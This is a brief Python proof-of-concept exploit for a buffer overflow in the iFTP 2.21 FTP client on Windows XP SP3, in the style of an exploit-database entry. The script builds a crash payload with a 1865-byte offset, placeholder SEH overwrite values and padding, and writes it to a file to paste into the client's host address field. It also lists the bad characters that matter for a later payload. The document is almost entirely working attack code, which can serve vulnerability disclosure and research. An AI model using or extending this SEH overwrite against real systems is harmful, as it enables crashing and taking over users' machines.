#!/usr/bin/python
###########################################################################################
#Exploit Title:iFTP 2.21 Buffer OverFlow Crash PoC
#Author: dogo h@ck
#Date Discovered :  12-5-2015
#Vendor Homepage: http://www.memecode.com/iftp.php
#Software Link: http://www.memecode.com/data/iftp-win32-v2.21.exe
#Version: 2.21
#Tested on : Windows XP Sp3
###########################################################################################
#Crash : Go to Connect >  Host Address > Post it
#Bad Characters (\x00\x09\x0a\x0d\x80 and all from \x80 To \xFF I know It's FU&^% :( )
############################################################################################

buffer = "A"*1865
buffer +="BBBB" #Pointer to next SEH record
buffer +="CCCC" #SE handler
buffer +="D"*500
file = "buffer.txt"

f = open(file, "w")

f.write(buffer)

f.close()